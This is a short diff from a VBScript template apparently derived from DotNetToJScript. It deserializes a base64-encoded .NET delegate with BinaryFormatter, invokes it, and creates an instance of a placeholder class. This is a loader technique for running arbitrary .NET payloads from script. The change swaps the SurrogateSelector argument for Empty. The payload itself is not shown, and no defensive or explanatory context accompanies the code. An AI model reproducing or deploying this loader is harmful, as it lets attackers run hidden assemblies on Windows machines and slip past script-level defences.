@@ -17,7 +17,7 @@ entry_class = "%CLASS%"
 Dim fmt, al, d, o
 Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
 Set al = CreateObject("System.Collections.ArrayList")
-al.Add fmt.SurrogateSelector
+al.Add Empty
 
 Set d = fmt.Deserialize_2(Base64ToStream(s))
 Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
